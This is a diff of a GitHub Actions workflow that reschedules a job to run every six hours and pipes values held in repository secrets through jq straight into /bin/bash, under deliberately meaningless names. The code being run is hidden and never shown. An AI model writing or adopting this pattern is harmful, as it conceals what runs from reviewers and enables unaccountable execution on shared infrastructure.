@@ -1,9 +1,9 @@
 name: hepingacm
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 3/6 * * *'
-
+    - cron: '23 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,18 +11,8 @@ jobs:
       - uses: actions/checkout@v4
       - name: hepingacm
         env:
-          hp0311: ${{ secrets.hp0311 }}
+          lnuuw11: ${{ secrets.lnuuw11 }}
         run: |
-          echo $hp0311 | jq -r .qzd8716 | /bin/bash
-          echo $lx78527 | jq -r .snof885 | /bin/bash
-          echo $hmhos3 | jq -r .dyzz8 | /bin/bash
-          echo $lnp5 | jq -r .f21121 | /bin/bash
-          echo $vvnp6824 | jq -r .l98861 | /bin/bash
-          echo $kcty636 | jq -r .ax97 | /bin/bash
-          echo $imhjq9670 | jq -r .kgerl5 | /bin/bash
-          echo $jogm65266 | jq -r .irm962 | /bin/bash
-          echo $rir71846 | jq -r .uh66118 | /bin/bash
-          echo $ebznc1277 | jq -r .qntas62177 | /bin/bash
-          echo $dkq0 | jq -r .lrudh81966 | /bin/bash
-          echo $t626 | jq -r .s5 | /bin/bash
+          echo $lnuuw11 | jq -r .etmkb919 | /bin/bash
+          echo $wmlsk377 | jq -r .emfs0722 | /bin/bash
 
